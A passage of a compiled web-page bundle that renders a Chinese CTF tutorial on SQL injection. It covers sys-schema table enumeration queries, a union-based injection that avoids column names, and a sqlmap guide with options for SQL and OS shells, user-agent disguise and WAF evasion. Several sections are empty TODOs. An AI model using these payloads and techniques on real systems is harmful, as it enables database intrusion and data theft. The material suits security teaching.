58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(12697.5,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(13187.5,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(13656.5,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(14101.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width:3;"></path></g></g></g>',1),E=[y],i=s("mjx-assistive-mml",{unselectable:"on",display:"inline",style:{top:"0px",left:"0px",clip:"rect(1px, 1px, 1px, 1px)","-webkit-touch-callout":"none","-webkit-user-select":"none","-khtml-user-select":"none","-moz-user-select":"none","-ms-user-select":"none","user-select":"none",position:"absolute",padding:"1px 0px 0px 0px",border:"0px",display:"block",width:"auto",overflow:"hidden"}},[s("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[s("mi",null,"p"),s("msub",null,[s("mi",null,"s"),s("mi",null,"s")]),s("mi",null,"c"),s("mi",null,"h"),s("mi",null,"e"),s("mi",null,"m"),s("msub",null,[s("mi",null,"a"),s("mi",null,"t")]),s("mi",null,"a"),s("mi",null,"b"),s("mi",null,"l"),s("msub",null,[s("mi",null,"e"),s("mi",null,"s")]),s("mi",null,"t"),s("mi",null,"a"),s("mi",null,"t"),s("mi",null,"i"),s("mi",null,"s"),s("mi",null,"t"),s("mi",null,"i"),s("mi",null,"c"),s("msub",null,[s("mi",null,"s"),s("mi",null,"i")]),s("mi",null,"o"),s("mrow",{"data-mjx-texclass":"ORD"},[s("mo",null,"、")]),s("mi",null,"s"),s("mi",null,"y"),s("mi",null,"s"),s("mo",null,"."),s("mi",null,"x")])],-1),u=n(`<p>其中就包含了存储数据库和对应的数据表，于是就有了如下的表名查询方式</p><div class="language-sql vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> table_name </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">sys</span><span style="color:#E1E4E8;">.</span><span style="color:#79B8FF;">schema_table_statistics_with_buffer</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">where</span><span style="color:#E1E4E8;"> table_schema</span><span style="color:#F97583;">=*database*</span><span style="color:#E1E4E8;">();</span></span>
<span class="line"><span style="color:#F97583;">select</span><span style="color:#E1E4E8;"> table_name </span><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">sys</span><span style="color:#E1E4E8;">.</span><span style="color:#79B8FF;">x</span><span style="color:#E1E4E8;">$schema_table_statistics_with_buffer </span><span style="color:#F97583;">where</span><span style="color:#E1E4E8;"> table_schema</span><span style="color:#F97583;">=*database*</span><span style="color:#E1E4E8;">();</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">select</span><span style="color:#24292E;"> table_name </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">sys</span><span style="color:#24292E;">.</span><span style="color:#005CC5;">schema_table_statistics_with_buffer</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">where</span><span style="color:#24292E;"> table_schema</span><span style="color:#D73A49;">=*database*</span><span style="color:#24292E;">();</span></span>
<span class="line"><span style="color:#D73A49;">select</span><span style="color:#24292E;"> table_name </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">sys</span><span style="color:#24292E;">.</span><span style="color:#005CC5;">x</span><span style="color:#24292E;">$schema_table_statistics_with_buffer </span><span style="color:#D73A49;">where</span><span style="color:#24292E;"> table_schema</span><span style="color:#D73A49;">=*database*</span><span style="color:#24292E;">();</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnV68mdIQmovJwczDsOc53gc.png" alt=""></p><h3 id="无列名注入" tabindex="-1">无列名注入 <a class="header-anchor" href="#无列名注入" aria-label="Permalink to &quot;无列名注入&quot;">​</a></h3><p>在因为 <code>information_schema</code> 被过滤或其他原因无法获得字段名的时候，可以通过别名的方式绕过获取字段名的这一步骤</p><p><code>select a,b from (select 1 as a, 2 as b union select * from users)x;</code></p><p><img src="https://cdn.xyxsw.site/boxcnI3jJNlLqq4f7WqRKGEWTeh.png" alt=""></p><h2 id="超脱-mysql-之外-todo" tabindex="-1">超脱 MySQL 之外 (TODO) <a class="header-anchor" href="#超脱-mysql-之外-todo" aria-label="Permalink to &quot;超脱 MySQL 之外 (TODO)&quot;">​</a></h2><h3 id="不同数据库后端的判别" tabindex="-1">不同数据库后端的判别 <a class="header-anchor" href="#不同数据库后端的判别" aria-label="Permalink to &quot;不同数据库后端的判别&quot;">​</a></h3><p>虽然在以往的 CTF 比赛中，MySQL 的出镜率非常高，但在绝大多数的生产环境中（起码在国内），OracleDB、MSSQL 等数据库是绝对的占有率霸主。而一些大型互联网企业则可能使用的是更新的 “高新技术”，例如 ClickHouse、PostgreSQL、MongoDB 等。</p><p>那么如何去判别一个 Web 应用的数据库后端用的是什么呢？</p><p>这一小节就来简单地讲一讲一些针对这种情况的常见方法。</p><h3 id="各数据库的攻击面拓展" tabindex="-1">各数据库的攻击面拓展 <a class="header-anchor" href="#各数据库的攻击面拓展" aria-label="Permalink to &quot;各数据库的攻击面拓展&quot;">​</a></h3><h3 id="nosql-注入" tabindex="-1">noSQL 注入 <a class="header-anchor" href="#nosql-注入" aria-label="Permalink to &quot;noSQL 注入&quot;">​</a></h3><p>工具 nosqlmap</p><h2 id="sql-注入防范手段-todo" tabindex="-1">SQL 注入防范手段 (TODO) <a class="header-anchor" href="#sql-注入防范手段-todo" aria-label="Permalink to &quot;SQL 注入防范手段 (TODO)&quot;">​</a></h2><h2 id="一些-cve-复现-todo" tabindex="-1">一些 CVE 复现 (TODO) <a class="header-anchor" href="#一些-cve-复现-todo" aria-label="Permalink to &quot;一些 CVE 复现 (TODO)&quot;">​</a></h2><h3 id="thinkphp-sql-注入" tabindex="-1">ThinkPHP SQL 注入 <a class="header-anchor" href="#thinkphp-sql-注入" aria-label="Permalink to &quot;ThinkPHP SQL 注入&quot;">​</a></h3><h3 id="django-sql-注入" tabindex="-1">Django SQL 注入 <a class="header-anchor" href="#django-sql-注入" aria-label="Permalink to &quot;Django SQL 注入&quot;">​</a></h3><h3 id="gorm-sql-注入" tabindex="-1">Gorm SQL 注入 <a class="header-anchor" href="#gorm-sql-注入" aria-label="Permalink to &quot;Gorm SQL 注入&quot;">​</a></h3><h2 id="数据库注入工具-sqlmap-及其高级使用指南" tabindex="-1">数据库注入工具 SQLMAP 及其高级使用指南 <a class="header-anchor" href="#数据库注入工具-sqlmap-及其高级使用指南" aria-label="Permalink to &quot;数据库注入工具 SQLMAP 及其高级使用指南&quot;">​</a></h2><blockquote><p>这里不讨论诸如 -u 这种简单参数</p></blockquote><h3 id="一些特殊参数" tabindex="-1">一些特殊参数 <a class="header-anchor" href="#一些特殊参数" aria-label="Permalink to &quot;一些特殊参数&quot;">​</a></h3><h4 id="r-文件名" tabindex="-1">-r [文件名] <a class="header-anchor" href="#r-文件名" aria-label="Permalink to &quot;-r [文件名]&quot;">​</a></h4><p>当你从 Burp 之类的工具中发现了 数据库注入的痕迹</p><p>可以全选右键保存你发送有效载荷（含有 Sql 注入的语句）的明文报文</p><p>复制到文件中保存</p><p>使用 -r 后跟保存的文件 sqlmap 会自动获得发送恶意报文的神奇能力（x 其实是自动解析了）</p><p>对你传入的报文的目标进行自动化的 sql 注入</p><h4 id="sql-shell" tabindex="-1">--sql-shell <a class="header-anchor" href="#sql-shell" aria-label="Permalink to &quot;--sql-shell&quot;">​</a></h4><p>在摸索到 数据库注入的时候 生成一个交互式的数据库注入</p><p>可以直接编写可执行的 sql 语句</p><p>例如 select &quot;123&quot;</p><p>Sqlmap 会自动探寻目标的注入返回结果 减少手动编写 payload 的辛劳</p><blockquote><p>尤其是写了半天发现引号对不上等等</p></blockquote><h4 id="os-shell" tabindex="-1">--os-shell <a class="header-anchor" href="#os-shell" aria-label="Permalink to &quot;--os-shell&quot;">​</a></h4><p>一个新手以为很牛逼但是其实很鸡肋的功能 可以获取 shell 一般是通过数据库注入获取到写文件的权限，写入 webshell 文件 的原理拿到对方机器的 shell</p><p>可是这个玩意非常的鸡肋</p><p>因为 默认数据库配置不具有这种问题需要另外配置 此外环境需要支持类似动态执行的功能 例如 go 起的 web</p><h4 id="random-agent" tabindex="-1">--random-agent <a class="header-anchor" href="#random-agent" aria-label="Permalink to &quot;--random-agent&quot;">​</a></h4><p>一般不用 但是 sqlmap 在进行 web 的注入时会使用 sqlmap 的 User-Agent 痕迹非常明显</p><p>可以用这个消磨一下自己的痕迹</p><h4 id="second-url" tabindex="-1">--second-url <a class="header-anchor" href="#second-url" aria-label="Permalink to &quot;--second-url&quot;">​</a></h4><p>对于一些非常复杂的数据库二次注入 sqlmap 其实是没有办法的 例如需要鉴权（？）</p><blockquote><p>此处有待考证</p></blockquote><p>但是对于简单的一些二次注入，可以通过这个参数获取到存在数据库注入界面的结果界面。让 sqlmap 获取到 数据库注入的结果。</p><h4 id="technique" tabindex="-1">--technique <a class="header-anchor" href="#technique" aria-label="Permalink to &quot;--technique&quot;">​</a></h4><p>技巧 指定 sqlmap 使用的注入技术</p><p>有以下几种</p><ul><li><code>t</code> 基于时间 time</li><li><code>b</code> 基于布尔 boolean</li><li><code>e</code> 基于报错 error</li><li><code>u</code> 联合注入 union</li><li><code>q</code> 内联注入 inline query</li><li><code>s</code> 堆叠注入 stack</li></ul><p>通常而言 sqlmap 在进行自动化注入尝试的时候常常是会先检测到 time 这一类注入</p><p>但是对于 union 和 boolean 则是最后进行检查的</p><p>而往往当你存在 union 或者 boolean 注入的时候，其实 time 多半也会一同存在</p><p>Sqlmap 很可能在接下来的 数据库注入后利用中使用耗时更为巨大的 time 注入技巧</p><p>这对于攻击者其实是不利的</p><p>那么通过这个参数去指定对应的注入技巧 可以大大减少数据库注入获取结果的时间 优化你的进攻效率</p><h4 id="dbms" tabindex="-1">--dbms <a class="header-anchor" href="#dbms" aria-label="Permalink to &quot;--dbms&quot;">​</a></h4><p>指定对应的数据库类型</p><p>Mysql mssql 之类的 sqlmap 就不会去搜索爆破其他类型的数据库</p><h4 id="hex" tabindex="-1">--hex <a class="header-anchor" href="#hex" aria-label="Permalink to &quot;--hex&quot;">​</a></h4><p>以十六进制来进行注入的技巧</p><p>在数据注入的时候使用这个可以规避掉一些 WAF</p><h2 id="waf-绕过-将特殊的-payload-编码的脚本" tabindex="-1">WAF 绕过 - 将特殊的 payload 编码的脚本 <a class="header-anchor" href="#waf-绕过-将特殊的-payload-编码的脚本" aria-label="Permalink to &quot;WAF 绕过 - 将特殊的 payload 编码的脚本&quot;">​</a></h2><h2 id="自定义-payload-自定义你的核心攻击语句" tabindex="-1">自定义 Payload - 自定义你的核心攻击语句 <a class="header-anchor" href="#自定义-payload-自定义你的核心攻击语句" aria-label="Permalink to &quot;自定义 Payload - 自定义你的核心攻击语句&quot;">​</a></h2>`,64);function d(m,F,b,h,T,Q){return a(),l("div",null,[t,s("blockquote",null,[s("p",null,[p("查询表的统计信息，其中还包括 InnoDB 缓冲池统计信息，默认情况下按照增删改查操作的总表 I/O 延迟时间（执行时间，即也可以理解为是存在最多表 I/O 争用的表）降序排序，数据来源：performance_schema.table_io_waits_summary_by_table、sys.x"),s("mjx-container",c,[(a(),l("svg",r,E)),i]),p("innodb_buffer_stats_by_table")])]),u])}const C=o(e,[["render",d]]);export{A as __pageData,C as default};
